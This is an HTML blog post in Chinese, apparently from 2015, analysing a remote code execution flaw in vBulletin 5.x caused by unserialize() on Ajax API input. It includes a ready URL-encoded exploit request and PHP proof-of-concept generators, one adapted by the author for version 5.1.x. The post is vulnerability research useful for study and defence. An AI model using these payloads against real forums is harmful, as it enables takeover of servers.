@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="vBulletin 的一枚 RCE 利用和简要的分析被曝光，产生漏洞的原因源于 vBulletin 程序在处理 Ajax API 调用的时候，使用 unserialize() 对传递的参数值进行了反序列化操作，导致攻击者使用精心构造出的 Payload 直接导致代码执行。关于 PHP 中反序列化漏洞的问题可以参考 OWASP 的《PHP Object Injection》。 使用 原文 提供的 P">
+<meta name="keywords" content="web,security,php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unserialize() 实战之 vBulletin 5.x.x 远程代码执行">
+<meta property="og:url" content="http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/index.html">
+<meta property="og:site_name" content="rickgray.me">
+<meta property="og:description" content="vBulletin 的一枚 RCE 利用和简要的分析被曝光，产生漏洞的原因源于 vBulletin 程序在处理 Ajax API 调用的时候，使用 unserialize() 对传递的参数值进行了反序列化操作，导致攻击者使用精心构造出的 Payload 直接导致代码执行。关于 PHP 中反序列化漏洞的问题可以参考 OWASP 的《PHP Object Injection》。 使用 原文 提供的 P">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/1.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/2.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/3.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/4.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/5.png">
+<meta property="og:updated_time" content="2018-04-24T15:48:57.517Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="unserialize() 实战之 vBulletin 5.x.x 远程代码执行">
+<meta name="twitter:description" content="vBulletin 的一枚 RCE 利用和简要的分析被曝光，产生漏洞的原因源于 vBulletin 程序在处理 Ajax API 调用的时候，使用 unserialize() 对传递的参数值进行了反序列化操作，导致攻击者使用精心构造出的 Payload 直接导致代码执行。关于 PHP 中反序列化漏洞的问题可以参考 OWASP 的《PHP Object Injection》。 使用 原文 提供的 P">
+<meta name="twitter:image" content="http://rickgray.me/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>unserialize() 实战之 vBulletin 5.x.x 远程代码执行</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2015/11/25/untrusted-deserialization-exploit-with-java/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2015/11/03/server-side-template-injection-attack-analysis/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&text=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&title=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&is_video=false&description=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=unserialize() 实战之 vBulletin 5.x.x 远程代码执行&body=Check out this article: http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&title=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&title=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&title=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&title=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&name=unserialize() 实战之 vBulletin 5.x.x 远程代码执行&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、反序列化触发点跟踪"><span class="toc-number">1.</span> <span class="toc-text">一、反序列化触发点跟踪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、利用分析和完善"><span class="toc-number">2.</span> <span class="toc-text">二、利用分析和完善</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、小结"><span class="toc-number">3.</span> <span class="toc-text">三、小结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        unserialize() 实战之 vBulletin 5.x.x 远程代码执行
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">rickgray.me</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2015-11-05T16:00:00.000Z" itemprop="datePublished">2015-11-06</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/php/">php</a>, <a class="tag-link" href="/tags/security/">security</a>, <a class="tag-link" href="/tags/web/">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>vBulletin 的一枚 RCE 利用和简要的分析被曝光，产生漏洞的原因源于 vBulletin 程序在处理 Ajax API 调用的时候，使用 <code>unserialize()</code> 对传递的参数值进行了反序列化操作，导致攻击者使用精心构造出的 Payload 直接导致代码执行。关于 PHP 中反序列化漏洞的问题可以参考 OWASP 的<a href="https://www.owasp.org/index.php/PHP_Object_Injection" target="_blank" rel="noopener">《PHP Object Injection》</a>。</p>
+<p>使用 <a href="http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq" target="_blank" rel="noopener">原文</a> 提供的 Payload 可以直接在受影响的站点上执行 <code>phpinfo(1)</code>：</p>
+<p><img src="/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/1.png" alt=""></p>
+<p>具体 Payload 的构造过程也文中有所提及，但是笔者在对 vBulletin 5.1.x 版本进行测试的时候，发现原本的 Payload 并不能成功，甚是疑惑。然而在深入分析后，发现在具体利用的时候还需要结合 vBulletin 程序本身的一些代码结构才能得到一个较为通用的 Payload，通过下面的分析后就能够明白。</p>
+<h3 id="一、反序列化触发点跟踪"><a href="#一、反序列化触发点跟踪" class="headerlink" title="一、反序列化触发点跟踪"></a>一、反序列化触发点跟踪</h3><p>虽然此次漏洞 <code>unserialize()</code> 函数的触发在曝光的文章中已经描述的很清楚了，并且对整个关键代码的触发流程也进行了说明，但是在深入跟踪和分析时，觉得还是有值得注意和学习的地方。</p>
+<pre><code>http://172.16.96.130/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D
+</code></pre><p>通过观察服务端在处理PHP时的调用栈，可知服务端在处理上述请求时，会将 <code>ajax/api/hook/decodeArguments</code> 作为路由参数 <code>$_REQUEST[&#39;routestring&#39;]</code> 传递给地址路由处理过程。因其符合 <code>ajax/api/[controller]/[method]</code> 的 Ajax API 请求路由格式，会再调用 <code>vB5_Frontend_ApplicationLight</code> 实例中的 <code>handleAjaxApi()</code> 函数来进行相应的模块加载并调用处理函数：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">handleAjaxApi</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$routeInfo = explode(<span class="string">'/'</span>, $_REQUEST[<span class="string">'routestring'</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (count($routeInfo) &lt; <span class="number">4</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">'ajax'</span>, <span class="string">'api'</span>, <span class="keyword">array</span>(), <span class="string">'invalid_request'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$params = array_merge($_POST, $_GET);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;sendAsJson(Api_InterfaceAbstract::instance(Api_InterfaceAbstract::API_LIGHT)-&gt;callApi($routeInfo[<span class="number">2</span>], $routeInfo[<span class="number">3</span>], $params, <span class="keyword">true</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>请求的 <code>ajax/api/hook/decodeArguments</code> 会实例化 <code>hook</code> 类然后调用 <code>decodeArguments()</code> 函数，原文中所提及的触发点就在此处：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decodeArguments</span><span class="params">($arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ($args = @unserialize($arguments))</span><br><span class="line">	&#123;</span><br><span class="line">		$result = <span class="string">''</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">foreach</span> ($args <span class="keyword">AS</span> $varname =&gt; $value)</span><br><span class="line">		&#123;</span><br><span class="line">			$result .= $varname;</span><br></pre></td></tr></table></figure>
+<p>通过反序列化，我们可以使之能生成在执行环境上下文中已经定义好了的类实例，并通过寻找一个含有 <code>__wakeup()</code> 或者 <code>__destruct()</code> 魔术方法存在问题的类来进行利用。然后原文中所提到的利用方法并不是这样，其使用的是继承于 PHP 迭代器类型的 <code>vB_dB_Result</code> 类，由于 <code>$args = @unserialize($arguments)</code> 产生了一个迭代器 <code>vB_dB_Result</code> 类实例，因此在后面进行 <code>foreach</code> 操作时会首先调用其 <code>rewind()</code> 函数。</p>
+<p>而在 <code>rewind()</code> 函数处理过程中，会根据实例变量状态进行调用：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rewind</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;recordset)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db-&gt;free_result(<span class="keyword">$this</span>-&gt;recordset);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>这里就可以通过反序列化来控制 <code>$this-&gt;recordset</code> 的值，并且 <code>$this-&gt;db-&gt;free_result</code> 最终会调用：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">free_result</span><span class="params">($queryresult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;sql = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">return</span> @<span class="keyword">$this</span>-&gt;functions[<span class="string">'free_result'</span>]($queryresult);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>$this-&gt;functions[&#39;free_result&#39;]</code> 原本的初始化值为 <code>mysql_free_result</code>，但是由于反序列化的原因，我们也能控制 <code>vB_dB_Result</code> 类实例中的 <code>db</code> 成员，更改其对应的 <code>functions[&#39;free_result&#39;]</code> 为我们想要执行的函数，因此一个任意代码执行就产生了。</p>
+<h3 id="二、利用分析和完善"><a href="#二、利用分析和完善" class="headerlink" title="二、利用分析和完善"></a>二、利用分析和完善</h3><p>观察一下原文中提供的 Payload 构造 PoC：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_Database</span> </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> $functions = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;functions[<span class="string">'free_result'</span>] = <span class="string">'phpinfo'</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_dB_Result</span> </span>&#123;</span><br><span class="line">       <span class="keyword">protected</span> $db;</span><br><span class="line">       <span class="keyword">protected</span> $recordset;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> vB_Database();</span><br><span class="line">               <span class="keyword">$this</span>-&gt;recordset = <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> urlencode(serialize(<span class="keyword">new</span> vB_dB_Result())) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
+<p>通过第一部分的分析，我们已经清楚了整个漏洞的函数调用过程和原因，并且也已经得知哪些参数可以得到控制和利用。因此这里我们修改 <code>$this-&gt;functions[&#39;free_result&#39;] = &#39;assert&#39;;</code> 和 <code>$this-&gt;recordset = &#39;var_dump(md5(1))&#39;;</code>，最终远程代码执行的的函数则会是 <code>assert(&#39;var_dump(md5(1))&#39;)</code>：</p>
+<p><img src="/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/2.png" alt=""></p>
+<p>这个时候其实 RCE 已经非常的顺利了，但是在进行测试的时候却发现了原文所提供的 PoC 只能复现 5.0.x 版本的 vBulletin，而 5.1.x 版本的却不可以。通过本地搭建测试环境，并使用同样的 PoC 去测试，发现在 5.1.x 版本中 <code>vB_Database</code> 被定义成了抽象类：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">vB_Database</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * The type of result set to return from the database for a specific row.</span></span><br><span class="line"><span class="comment">	 */</span></span><br></pre></td></tr></table></figure>
+<p>抽象类是不能直接进行实例化的，原文提供的 PoC 却是实例化的 <code>vB_Database</code> 类作为 <code>vB_dB_Result</code> 迭代器成员 <code>db</code> 的值，在服务端进行反序列化时会因为需要恢复实例为抽象类而导致失败：</p>
+<p><img src="/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/3.png" alt=""></p>
+<p>这就是为什么在 5.1.x 版本上 PoC 会不成功的原因。然后要解决这个问题也很容易，通过跟踪调用栈，发现程序在反序列化未定义类时会调用程序注册的 <code>autoload()</code> 方法去动态加载类文件。这里 vBulletin 会依次调用 <code>includes/vb5/autoloader.php</code> 中的 <code>_autoload</code> 方法和 <code>core/vb/vb.php</code> 中的 <code>autoload()</code> 方法，成功加载即返回，失败则反序列化失败。所以要想继续使用原有 PoC 的思路来让反序列化后会执行 <code>$this-&gt;db-&gt;free_result($this-&gt;recordset);</code> 则需要找到一个继承于 <code>vB_Database</code> 抽象类的子类并且其源码文件路径能够在 autoload 过程中得到加载。</p>
+<p>通过搜索，发现有如下类继承于 <code>vB_Database</code> 抽象类及其源码对应的路径：</p>
+<p><img src="/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/4.png" alt=""></p>
+<p>而终代码进行进行 autoload 的时候会解析传递的类名来动态构造尝试加载的源码文件路径：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">...省略</span><br><span class="line">	$fname = str_replace(<span class="string">'_'</span>, <span class="string">'/'</span>, strtolower($class)) . <span class="string">'.php'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span> (<span class="keyword">self</span>::$_paths <span class="keyword">AS</span> $path)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (file_exists($path . $fname))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">include</span>($path . $fname);</span><br><span class="line">			<span class="keyword">if</span> (class_exists($class, <span class="keyword">false</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>
+<p>上面这段代码存在于第一次调用的 <code>__autoload()</code> 里，可以看到对提供的类名以 <code>_</code> 进行了拆分，动态构造了加载路径（第二次 autoload() 的过程大致相同），简单分析一下就可以发现只有在反序列化 <code>vB_Database_MySQL</code> 和 <code>vB_Database_MySQLi</code> 这两个基于 <code>vB_Database</code> 抽象类的子类时，才能成功的动态加载其类定义所在的源码文件使得反序列化成功执行，最终才能控制参数进行任意代码执行。</p>
+<p>所以，针对 5.1.x 版本 vBulletin 的 PoC 就可以得到了，使用 <code>vB_Database_MySQL</code> 或者 <code>vB_Database_MySQLi</code> 作为迭代器 <code>vB_dB_Result</code> 成员 <code>db</code> 的值即可。具体 PoC 如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_Database_MySQL</span> </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> $functions = <span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;functions[<span class="string">'free_result'</span>] = <span class="string">'assert'</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vB_dB_Result</span> </span>&#123;</span><br><span class="line">       <span class="keyword">protected</span> $db;</span><br><span class="line">       <span class="keyword">protected</span> $recordset;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> vB_Database_MySQL();</span><br><span class="line">               <span class="keyword">$this</span>-&gt;recordset = <span class="string">'print("This Vuln In 5.1.7")'</span>;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> urlencode(serialize(<span class="keyword">new</span> vB_dB_Result())) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
+<p>测试一下，成功执行 <code>assert(&#39;print(&quot;This Vuln In 5.1.7&quot;)&#39;)</code>：</p>
+<p><img src="/images/articles/2015-11-06-unserialize-attack-with-vbulletin-5-x-x-rce/5.png" alt=""></p>
+<p>当然了，PoC 不止上面所提供的这一种写法，仅供参考而已。</p>
+<h3 id="三、小结"><a href="#三、小结" class="headerlink" title="三、小结"></a>三、小结</h3><p>此次 vBulletin 5.x.x RCE 漏洞的曝光，从寻找触发点到对象的寻找，再到各种自动加载细节，不得不说是一个很好的 PHP 反序列化漏洞实战实例。不仔细去分析真的不能发现原作者清晰的思路和对程序的熟悉程度。</p>
+<p>另外，<a href="http://blog.checkpoint.com/" target="_blank" rel="noopener">Check Point</a> 在其官方博客上也公布了反序列化的另一个利用点，通过反序列化出一个模版对象最终调用 <code>eval()</code> 函数进行执行（<a href="http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/" target="_blank" rel="noopener">原文</a>）。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a href="http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq" target="_blank" rel="noopener">http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq</a></li>
+<li><a href="https://www.owasp.org/index.php/PHP_Object_Injection" target="_blank" rel="noopener">https://www.owasp.org/index.php/PHP_Object_Injection</a></li>
+<li><a href="http://php.net/manual/en/class.iterator.php" target="_blank" rel="noopener">http://php.net/manual/en/class.iterator.php</a></li>
+<li><a href="http://www.php.net/manual/en/function.autoload.php" target="_blank" rel="noopener">http://www.php.net/manual/en/function.autoload.php</a></li>
+<li><a href="http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/" target="_blank" rel="noopener">http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/</a></li>
+<li><a href="http://www.sebug.net/vuldb/ssvid-89707" target="_blank" rel="noopener">http://www.sebug.net/vuldb/ssvid-89707</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、反序列化触发点跟踪"><span class="toc-number">1.</span> <span class="toc-text">一、反序列化触发点跟踪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、利用分析和完善"><span class="toc-number">2.</span> <span class="toc-text">二、利用分析和完善</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、小结"><span class="toc-number">3.</span> <span class="toc-text">三、小结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&text=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&title=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&is_video=false&description=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=unserialize() 实战之 vBulletin 5.x.x 远程代码执行&body=Check out this article: http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&title=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&title=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&title=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&title=unserialize() 实战之 vBulletin 5.x.x 远程代码执行"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce/&name=unserialize() 实战之 vBulletin 5.x.x 远程代码执行&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 RickGray
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
